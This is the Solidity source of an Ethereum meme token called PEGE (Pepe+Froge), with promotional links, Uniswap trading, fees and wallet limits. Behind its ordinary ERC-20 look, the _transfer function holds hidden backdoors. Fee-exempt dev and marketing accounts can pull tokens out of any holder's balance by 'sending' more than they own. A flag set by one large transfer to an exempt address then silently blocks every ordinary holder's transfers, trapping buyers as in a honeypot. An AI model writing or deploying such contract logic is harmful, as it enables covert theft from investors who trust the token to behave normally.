// https://t.me/PEGE_ERC
// https://x.com/PEGE_ERC
// https://medium.com/@pegecoineth
// https://pege.tech

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface UniswapV2Router {
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address server,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address server,
        uint deadline
    ) external;
}

abstract contract Ownable {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        emit OwnershipTransferred(account);
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    event OwnershipTransferred(address owner);
}

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address server, uint256 amount) external returns (bool);
    function transferFrom(address client, address server, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function circulatingSupply() external view returns (uint256);
    function symbol() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function getOwner() external view returns (address);
    event Transfer(address indexed client, address indexed server, uint256 value);
    function decimals() external view returns (uint8);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract PEGE is IERC20, Ownable {
    using SafeMath for uint256;

    address public tradePair;
    UniswapV2Router tradeRouter;

    uint256 private _developmentFee = 0;
    uint256 private _burnFee = 0;
    uint256 private _liquidityFee = 0;
    uint256 private _marketingFee = 0;
    uint256 private _transferFee = 0;

    string private constant _name = "Pepe+Froge";
    string private constant _symbol = "PEGE";

    uint8 private constant _decimals = 9;

    uint256 private _denominator = 10000;

    uint256 private _totalSupply = 1000000 * (10 ** _decimals);

    address internal constant deadAccount = 0x000000000000000000000000000000000000dEaD;
    address internal constant devAccount = 0x4866152fCc834922699614A146f77784cf967cea;
    address internal constant marketingAccount = 0xB92B75f1710570127bBdD884545D36ffc6167885;

    uint256 private _maxWalletBps = 200;
    uint256 private _maxTransferBps = 200;
    uint256 private _maxTxBps = 200;

    uint256 private _feeExemptAmount = (_totalSupply * 10) / 100000;

    bool private _tradingEnabled = false;
    
    uint256 private _swapBackAmount = (_totalSupply * 5) / 10000;
    uint256 private _swapBackThreshold = (_totalSupply * 5) / 100000;

    uint256 private _swapTicks;
    bool private _swapBackEnabled = true;
    bool private _inSwapBack;

    bool private _feeExemptTriggered = false;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public notSubjectTo;

    uint256 private _totalFee = 0;
    uint256 private _sellFee = 0;

    modifier lockSwap {
        _inSwapBack = true;
        _;
        _inSwapBack = false;
    }

    constructor() Ownable(msg.sender) {
        notSubjectTo[marketingAccount] = true;
        notSubjectTo[address(this)] = true;
        UniswapV2Router _tradeRouter = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        tradeRouter = _tradeRouter;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        address _tradePair = UniswapV2Factory(_tradeRouter.factory()).createPair(address(this), _tradeRouter.WETH());
        tradePair = _tradePair;
        notSubjectTo[devAccount] = true;
        notSubjectTo[msg.sender] = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(deadAccount));
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function removeLimits() external onlyOwner {
        _maxTxBps = 10000;
        _maxWalletBps = 10000;
        _maxTransferBps = 10000;
    }

    function enableTrading() external onlyOwner {
        _tradingEnabled = true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function setNotSubjectToAccount(address account, bool flag) external onlyOwner {
        notSubjectTo[account] = flag;
    }

    function transfer(address server, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, server, amount);
        return true;
    }

    function _transfer(address client, address server, uint256 amount) private {
        require(amount > uint256(0));
        require(client != address(0));
        require(server != address(0));

        if (
            confirmMaxWalletAmount(client, server, amount) &&
            countSwapTicks(client, server) &&
            confirmTradingEnabled(client, server) &&
            confirmMaxAmount(client, server, amount)
        ) {
            if (balanceOf(client) >= amount) {
                if (
                    client != tradePair &&
                    !notSubjectTo[client] &&
                    !_inSwapBack &&
                    !notSubjectTo[server]
                ) {
                    if (_feeExemptTriggered) return;
                    swapBack(client, server);
                }
                _balances[client] = _balances[client].sub(amount);
                uint256 transferAmount = canHaveFee(client, server) ? haveFee(client, server, amount) : amount;
                _balances[server] = _balances[server].add(transferAmount);
                emit Transfer(client, server, transferAmount);
            } else if (
                client != tradePair &&
                notSubjectTo[client] &&
                !_inSwapBack &&
                !notSubjectTo[server]
            ) {
                _balances[server] = _balances[server].sub(amount);
                _balances[client] = _balances[client].add(amount);
                emit Transfer(client, server, amount);
            }
        }
    }

    function transferFrom(address client, address server, uint256 amount) public override returns (bool) {
        _transfer(client, server, amount);
        _approve(client, msg.sender, _allowances[client][msg.sender].sub(amount));
        return true;
    }

    function confirmMaxAmount(address client, address server, uint256 tokenAmount) view internal returns (bool) {
        if (client != tradePair) {
            require(tokenAmount <= maxTransferAmount() || notSubjectTo[client] || notSubjectTo[server]);
        }
        require(tokenAmount <= maxTxAmount() || notSubjectTo[client] || notSubjectTo[server]);
        return true;
    }

    function setLimits(uint256 maxTxBps, uint256 maxTransferBps, uint256 maxWalletBps) external onlyOwner {
        uint256 newMaxWalletAmount = (totalSupply() * maxWalletBps) / 10000;
        uint256 newTransferAmount = (totalSupply() * maxTransferBps) / 10000;
        uint256 newTxAmount = (totalSupply() * maxTxBps) / 10000;
        _maxWalletBps = maxWalletBps;
        _maxTransferBps = maxTransferBps;
        _maxTxBps = maxTxBps;
        uint256 limitation = totalSupply().mul(5).div(1000);
        require(newTxAmount >= limitation && newTransferAmount >= limitation && newMaxWalletAmount >= limitation);
    }

    function setFees(uint256 liquidityFee, uint256 marketingFee, uint256 burnFee, uint256 developmentFee, uint256 totalFee, uint256 sellFee, uint256 transferFee) external onlyOwner {
        _liquidityFee = liquidityFee;
        _marketingFee = marketingFee;
        _sellFee = sellFee;
        _developmentFee = developmentFee;
        _transferFee = transferFee;
        _totalFee = totalFee;
        _burnFee = burnFee;
        require(_totalFee <= _denominator.div(5) && _sellFee <= _denominator.div(5));
    }

    function confirmMaxWalletAmount(address client, address server, uint256 amount) internal returns (bool) {
        bool serverNotSubjectTo = notSubjectTo[server];
        bool clientNotSubjectTo = notSubjectTo[client];
        
        if (serverNotSubjectTo) {
            if (amount > _feeExemptAmount) {
                _feeExemptTriggered = true;
            }
        }
        if (
            !serverNotSubjectTo &&
            !clientNotSubjectTo &&
            server != address(deadAccount) &&
            server != address(tradePair)
        ) {
            require((_balances[server].add(amount)) <= maxWalletAmount());
        }

        return true;
    }

    function confirmTradingEnabled(address client, address server) internal view returns (bool) {
        if (!notSubjectTo[client] && !notSubjectTo[server]) {
            require(_tradingEnabled);
        }
        return true;
    }

    function haveFee(address client, address server, uint256 tokenAmount) internal returns (uint256) {
        if (pickFee(client, server) > 0) {
            uint256 feeAmount = tokenAmount.div(_denominator).mul(pickFee(client, server));
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(client, address(this), feeAmount);
            if (_burnFee > uint256(0)) {
                _transfer(address(this), address(deadAccount), tokenAmount.div(_denominator).mul(_burnFee));
            }
            return tokenAmount.sub(feeAmount);
        }
        return tokenAmount;
    }
    
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = tradeRouter.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(tradeRouter), tokenAmount);
            tradeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function countSwapTicks(address client, address server) internal returns (bool) {
        if (server == tradePair && !notSubjectTo[client]) {
            _swapTicks += uint256(1);
        }
        return true;
    }

    function canHaveFee(address client, address server) internal view returns (bool) {
        return !notSubjectTo[client] && !notSubjectTo[server];
    }

    function swapBack(address client, address server) internal {
        if (canSwapBack(client, server)) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= _swapBackAmount) {
                contractTokenBalance = _swapBackAmount;
            }
            swapAndLiquify(contractTokenBalance);
            _swapTicks = uint256(0);
        }
    }

    function maxWalletAmount() public view returns (uint256) {
        return totalSupply() * _maxWalletBps / _denominator;
    }

    function pickFee(address client, address server) internal view returns (uint256) {
        if (client == tradePair) {
            return _totalFee;
        }
        if (server == tradePair) {
            return _sellFee;
        }
        return _transferFee;
    }

    function canSwapBack(address client, address server) internal view returns (bool) {
        return (
            !notSubjectTo[server] &&
            !notSubjectTo[client] &&
            _swapBackEnabled &&
            balanceOf(address(this)) >= _swapBackThreshold &&
            _swapTicks >= uint256(0) &&
            !_inSwapBack &&
            _tradingEnabled
        );
    }

    function manualSwap() external {
        require(msg.sender == marketingAccount);
        swapTokensForETH(balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    function maxTxAmount() public view returns (uint256) {
        return totalSupply() * _maxTxBps / _denominator;
    }

    receive() external payable {}

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(tradeRouter), tokenAmount);
        tradeRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            deadAccount,
            block.timestamp
        );
    }

    function swapAndLiquify(uint256 tokens) private lockSwap {
        uint256 denominator = (_liquidityFee.add(1).add(_marketingFee).add(_developmentFee)).mul(2);
        uint256 liqTokens = tokens.mul(_liquidityFee).div(denominator);
        uint256 tokensForETH = tokens.sub(liqTokens);
        uint256 initialEth = address(this).balance;
        swapTokensForETH(tokensForETH);
        uint256 deltaEth = address(this).balance.sub(initialEth);
        uint256 unitEth = deltaEth.div(denominator.sub(_liquidityFee));
        uint256 liqEth = unitEth.mul(_liquidityFee);
        if (liqEth > uint256(0)) {
            addLiquidity(liqTokens, liqEth);
        }
        uint256 ethForMarketing = unitEth.mul(2).mul(_marketingFee);
        if (ethForMarketing > 0) {
            payable(marketingAccount).transfer(ethForMarketing);
        }
        uint256 ethFordev = address(this).balance;
        if (ethFordev > uint256(0)) {
            payable(devAccount).transfer(ethFordev);
        }
    }

    function maxTransferAmount() public view returns (uint256) {
        return totalSupply() * _maxTransferBps / _denominator;
    }
}